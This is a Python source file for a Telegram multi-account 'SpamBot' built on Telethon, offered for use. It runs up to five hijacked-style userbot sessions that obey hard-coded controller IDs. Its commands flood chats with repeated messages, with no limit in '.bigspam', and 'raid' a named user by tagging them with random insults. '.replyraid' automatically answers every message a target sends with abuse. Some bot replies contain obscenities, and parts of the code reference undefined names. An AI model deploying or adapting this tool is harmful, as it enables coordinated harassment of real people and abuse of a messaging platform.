##############
##############
##############
##############

import os
import sys
import random
from datetime import datetime
from os import execl
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from Config import STRING01, SUDO, API_ID, API_HASH, STRING02, STRING03, STRING04 ,STRING05
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Utils import RAID, RRAID

##############
##############
##############
##############

a = API_ID
b = API_HASH
smex = STRING01
smexx = STRING02
smexxx = STRING03
smexxxx = STRING04
smexxxxx = STRING05

##############
##############
##############
##############

str1 = ""
str2 = ""
str3 = ""
str5 = ""
str4 = ""

##############
##############
##############
##############

que = {}

SMEX_USERS = [2092103173, 5057623667]
for x in SUDO:
    SMEX_USERS.append(x)
    
##############
##############
##############
##############    
    
async def start_yukki():
    global str1
    global str2
    global str3
    global str5
    global str4

##############
##############
##############
##############    
    
    if smex:
        session_name = str(smex)
        print("String 1 Found")
        str1 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await str1.start()
            botme = await str1.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            str1 = "smex"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "startup"
        str1 = TelegramClient(session_name, a, b)
        try:
            await str1.start()
        except Exception as e:
            pass
   
##############
##############
##############
##############            
            
    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        str2 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await str2.start()
            botme = await str2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "startup"
        str2 = TelegramClient(session_name, a, b)
        try:
            await str2.start()
        except Exception as e:
            pass
            
##############
##############
##############
##############            

    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        str3 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await  str3.start()
            botme = await str3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "startup"
        str3 = TelegramClient(session_name, a, b)
        try:
            await str3.start()
        except Exception as e:
            pass

##############
##############
##############
##############            
            
    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        str4 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await str4.start()
            botme = await str4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "startup"
        str4 = TelegramClient(session_name, a, b)
        try:
            await str4.start()
        except Exception as e:
            pass

##############
##############
##############
##############            
            
    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        str5 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await str5.start()
            botme = await str5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "startup"
        str5 = TelegramClient(session_name, a, b)
        try:
            await str5.start()
        except Exception as e:
            pass


##############
##############
##############
##############            
            
loop = asyncio.get_event_loop()
loop.run_until_complete(start_yukki())       

async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception as e:
        pass

##############
##############
##############
##############            

@str1.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.join"))       
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = yukki[0]
            text = "Joining..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))      
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = yukki[0]
            text = "Joining...."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit("Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

##############
##############
##############
##############            
        
@str1.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))     
async def _(e):
    usage = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄\n\n【﻿×××𝗟𝗲𝗮𝘃𝗲×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = yukki[0]
            bc = int(bc)
            text = "𝙻𝙴𝙰𝚅𝙸𝙽𝙶....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙻𝙴𝙵𝚃 !!\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
##############
##############
##############
##############            
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
async def spam(e):
    usage = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄\n\n【﻿×××𝗦𝗽𝗮𝗺×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

##############
##############
##############
##############            

@str1.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
async def spam(e):
    usage = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄\n\n【﻿×××𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        smex = await e.get_reply_message()
        yukki = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        yukkisexy = yukki[1:]
        if len(yukkisexy) == 2:
            message = str(yukkisexy[1])
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

##############
##############
##############
##############            
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
async def spam(e):
    usage = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄\n\n【﻿×××𝗕𝗶𝗴𝗦𝗽𝗮𝗺×××】\n【﻿𝘾𝙤𝙢𝙢𝙖𝙣𝙙 :】\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.0)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(0.0)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.0)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
##############
##############
##############
##############            
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(yukki[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(5.0) 
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(yukki[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.0)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )            
##############
##############
##############
##############            


##############
##############
##############
##############            

@str1.on(events.NewMessage(incoming=True))
@str2.on(events.NewMessage(incoming=True))
@str3.on(events.NewMessage(incoming=True))
@str4.on(events.NewMessage(incoming=True))
@str5.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.3)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        )

##############
##############
##############
##############            
            
@str1.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
async def _(e):
    global que
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 11:
            message = str(yukki[0])
            a = await e.client.get_entity(message)
            g = a.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "ᖇEᑭᒪY ᖇᗩIᗪ [ᗩᑕTIᐯᗩTEᗪ]!!\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "ᖇEᑭᒪY ᖇᗩIᗪ [ᗩᑕTIᐯᗩTEᗪ]!!\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

##############
##############
##############
##############

@str1.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
async def _(e):
    global que
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 12:
            message = str(yukki[0])
            a = await e.client.get_entity(message)
            g = a.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "𝚁𝙰𝙽𝙳𝙸 𝙺𝙸 𝙲𝙷𝚄𝙳𝙰𝙸 𝙳𝙾𝙽𝙴!!\nᖇEᑭᒪY ᖇᗩIᗪ [ᗪE-ᗩᑕTIᐯᗩTEᗪ]\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "𝚁𝙰𝙽𝙳𝙸 𝙺𝙸 𝙲𝙷𝚄𝙳𝙰𝙸 𝙳𝙾𝙽𝙴!!\nᖇEᑭᒪY ᖇᗩIᗪ [ᗪE-ᗩᑕTIᐯᗩTEᗪ]\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
    
##############
##############
##############
##############       

@str1.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
async def alive(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "🤖 I Am Still alive Lomdike !!!!\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"🤖 I Am Still alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄")
        
##############
##############
##############
##############

@str1.on(events.NewMessage(incoming=True, pattern=r"\.hang"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.hang"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.hang"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.hang"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.hang"))
async def hang(e):
    if e.sender_id in SMEX_USERS:
       text = "IN DEVLOPMENT"
       await e.reply(text, parse_mode=None, link_preview=None )
       
############## 
##############
##############
##############
@str1.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@str2.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@str3.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@str4.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@str5.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "🤖 I Am Still alive Lomdike !!!!\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"🤖 I Am Still alive Lomdike !!!!\n`{ms}` 𝗺𝘀\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄")
        
##############
##############
##############
##############        

@str1.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "【﻿ＲＥＳＴＡＲＴＩＮＧ】!!!\nPʟᴇᴀꜱᴇ Wᴀɪᴛ Tɪʟʟ lᴛ Rᴇʙᴏᴏᴛꜱ..\n•[×] 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄."
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await str1.disconnect()
        except Exception as e:
            pass
        try:
            await str2.disconnect()
        except Exception as e:
            pass
        try:
            await str3.disconnect()
        except Exception as e:
            pass
        try:
            await str4.disconnect()
        except Exception as e:
            pass
        try:
            await str5.disconnect()
        except Exception as e:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()
        
##############
##############
##############
##############        
        
@str1.on(events.NewMessage(incoming=True, pattern=r"\.help"))
async def help(e):
    if e.sender_id in SMEX_USERS:
       text = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄\n\n🔥 ᏟϴᎷᎷᎪΝᎠՏ 🔥\n༒ᗩᒪIᐯE\n༒ᑭIᑎG\n༒ᖇESTᗩᖇT\n༒ᒍOIᑎ\n༒ᒪEᗩᐯE\n༒ᑭᒍOIᑎ\n༒Sᑭᗩᗰ\n༒ᗷIGSᑭᗩᗰ\n༒ᗪEᒪᗩYSᑭᗩᗰ\n༒ᖇᗩIᗪ\n༒ᖇEᑭᒪYᖇᗩIᗪ\n༒ᕼᗩᑎG\n༒ᖇEᑭO"
       await e.reply(text, parse_mode=None, link_preview=None )
       
##############
##############
##############
##############
       
@str1.on(events.NewMessage(incoming=True, pattern=r"\.repo"))
async def repo(e):
    if e.sender_id in SMEX_USERS:
       text = "〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗰEᖇ ᗷOT 〄\n┏━━━━━━━━━━━━━━━━━━━\n┣➣ Sᴜᴘᴘᴏʀᴛ : [ᒍOIᑎ] @TeamRoodChat\n┣➣ Cʀᴇᴀᴛᴇʀ : [ᖇOOᗪ OᗯᑎEᖇ] @Rood_Gamer_Owner)\n┣➣ Rᴇᴩᴏ : [TYᑭE] OC PRIVATE\n┗━━━━━━━━━━━━━━━━━━━"
       await e.reply(text, parse_mode=None, link_preview=None )
    
##############
##############
##############
##############

text = """SPAM REPO BY @ROODCLAN MADE WITH LOVE"""

print(text)
print("")
print("DONE! 〄 ╚» ⟦★𓆩ᏒⲞⲞᗪ𓆪★⟧«╝ SᑭᗩᗰᗷOT 〄 STARTED.\nNOW ADD YOUR SPAMMERBOT IN ONE GROUP THEM TYPE .alive With Sudo Account")

##############
##############
##############
##############

if len(sys.argv) not in (1, 3, 4):
    try:
        str1.disconnect()
    except Exception as e:
        pass
    try:
        str2.disconnect()
    except Exception as e:
        pass
    try:
        str3.disconnect()
    except Exception as e:
        pass
    try:
        str4.disconnect()
    except Exception as e:
        pass
    try:
        str5.disconnect()
    except Exception as e:
        pass
else:
    try:
        str1.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str2.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str3.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str4.run_until_disconnected()
    except Exception as e:
        pass
    try:
        str5.run_until_disconnected()
    except Exception as e:
        pass

##############
##############
##############
##############        
